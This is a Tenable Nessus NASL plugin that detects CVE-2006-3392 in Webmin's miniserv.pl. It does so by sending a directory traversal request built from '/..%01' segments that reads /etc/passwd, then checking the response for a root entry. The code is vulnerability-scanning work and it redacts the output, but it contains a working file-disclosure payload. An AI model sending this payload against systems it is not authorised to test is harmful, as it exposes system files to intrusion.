#%NASL_MIN_LEVEL 70300
#
# (C) Tenable Network Security, Inc.
#

include('deprecated_nasl_level.inc');
include('compat.inc');

if (description)
{
  script_id(21785);
  script_version("1.22");
  script_set_attribute(attribute:"plugin_modification_date", value:"2021/01/19");

  script_cve_id("CVE-2006-3392");
  script_bugtraq_id(18744);

  script_name(english:"Webmin 'miniserv.pl' Arbitrary File Disclosure");
  script_summary(english:"Tries to read a local file using 'miniserv.pl'.");

  script_set_attribute(attribute:"synopsis", value:"The remote web server is affected by an information disclosure flaw.");
  script_set_attribute(attribute:"description", value:
"The version of Webmin installed on the remote host is affected by an
information disclosure flaw due to a flaw in the Perl script
'miniserv.pl'. This flaw could allow a remote, unauthenticated
attacker to read arbitrary files on the affected host, subject to the
privileges of the web server user .");
  script_set_attribute(attribute:"see_also", value:"http://www.webmin.com/changes-1.290.html");
  script_set_attribute(attribute:"solution", value:"Upgrade to Webmin 1.290 or later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_set_cvss_temporal_vector("CVSS2#E:POC/RL:OF/RC:C");
  script_set_attribute(attribute:"cvss_score_source", value:"CVE-2006-3392");

  script_set_attribute(attribute:"exploitability_ease", value:"No exploit is required");
  script_set_attribute(attribute:"exploit_available", value:"false");
  script_set_attribute(attribute:"vuln_publication_date", value:"2006/06/29");
  script_set_attribute(attribute:"patch_publication_date", value:"2006/06/29");
  script_set_attribute(attribute:"plugin_publication_date", value:"2006/06/30");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:webmin:webmin");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2006-2021 and is owned by Tenable, Inc. or an Affiliate thereof.");

  script_dependencies("webmin.nasl");
  script_require_keys("www/webmin");
  script_require_ports("Services/www", 10000);

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("data_protection.inc");

app = 'Webmin';
port = get_http_port(default:10000, embedded: TRUE);
get_kb_item_or_exit('www/'+port+'/webmin');

dir = "/";
install_url = build_url(port:port, qs:dir);

# Try to exploit the flaw to read a local file.
file = "/etc/passwd";
exploit = "unauthenticated" + crap(data:"/..%01", length:60) + file;

res = http_send_recv3(
  method : "GET",
  port   : port,
  item   : dir + exploit,
  exit_on_fail : TRUE
);

# There's a problem if there's an entry for root.
if (egrep(pattern:"root:.*:0:[01]:", string:res[2]))
{
  report = NULL;
  attach_file = NULL;
  output = NULL;
  req = install_url + exploit;
  request = NULL;

  if (report_verbosity > 0)
  {
    report =
      '\n' + 'Nessus was able to exploit this issue with the following URL : ' +
      '\n' +
      '\n' + req +
      '\n';

    if (report_verbosity > 1)
    {
      output = data_protection::redact_etc_passwd(output:res[2]);
      attach_file = file;
      request = make_list(req);
    }
  }

  security_report_v4(port:port,
                     extra:report,
                     severity:SECURITY_WARNING,
                     request:request,
                     file:attach_file,
                     output:output);

  exit(0);
}
audit(AUDIT_WEB_APP_NOT_AFFECTED, app, install_url);
